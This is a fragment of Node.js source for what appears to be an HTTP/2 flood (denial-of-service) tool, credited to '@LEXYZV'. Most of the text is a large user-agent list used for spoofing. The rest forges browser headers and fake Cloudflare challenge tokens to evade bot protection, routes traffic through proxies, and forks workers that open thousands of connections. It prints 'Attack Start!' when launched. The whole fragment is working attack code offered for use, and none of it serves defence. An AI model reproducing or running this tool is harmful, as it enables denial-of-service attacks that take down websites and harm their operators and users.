"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20010101 Firefox/103.0",
"Mozilla/5.0 (X11; U; Linux x86_64) Gecko/20071114 Firefox/104.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20172901 Firefox/104.0",
"Mozilla/5.0 (Windows NT 5.1; rv:98.0) Gecko/20100101 Firefox/98.0",
"Mozilla/5.0 (Android 7.1.2; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0",
'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 10; MI 9 MIUI/V12.0.4.0.QFAMIXM)',
'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 10; pl-pl; Mi MIX 2S Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.10.0-gn',
'Mozilla/5.0 (Linux; Android 8.0.0; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 10; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX3363 Build/RKQ1.210408.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',
'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A226B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 12; Mobile; LG-M255; rv:103.0) Gecko/103.0 Firefox/103.0',
'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36',
'Dalvik/2.1.0 (Linux; U; Android 11; M2007J20CG Build/RKQ1.200826.002)',
'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/103.0',
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 11; pl-pl; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.5.1-gn',
'Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; JynxBox) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobil',
'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobil',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.6; fr-fr; Nexus One Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.7; fr-fr; Nexus One Build/GWK74) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; Nexus One Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edg',
'Mozilla/5.0 (Windows Phone 10.0; Android 10; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 Edge/',
'Mozilla/5.0 (Windows Phone 10.0; Android 7.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Ed',
'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge',
'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Mobile Safari/537.36 Ed',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/5',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0',
'Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/',
'Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWA Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/5',
'Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/53',
'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1',
'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1',
'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPod; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/83.0.4103.88 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
];

let brandValue;

                        if (browserVersion === 120) {

                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 123) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                       
                      }
var userAgent = uap[Math.floor(Math.floor(Math.random() * uap.length))];
                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6,6) + ".net" : refererValue;
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": "cross-site" }),
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "en-US,en;q=0.9",
                            //...(Math.random() < 0.4 && { "priority": `u=${fwq}, i` }),
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = headers.concat(headers2);

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, isFull ? 1000 : 1000 / ratelimit)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.2\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)

    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.clear()
    console.log('Attack Start! \ndown? send to @LEXYZV \nHA method\n\nurl: ' + process.argv[3] + '\nrequest method: ' + process.argv[2] + '\ntime: ' + process.argv[4] + '\nratelimit: ' + process.argv[5] + '\nthreads: ' + process.argv[6] + '\n\nMethod by @LEXYZV');

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}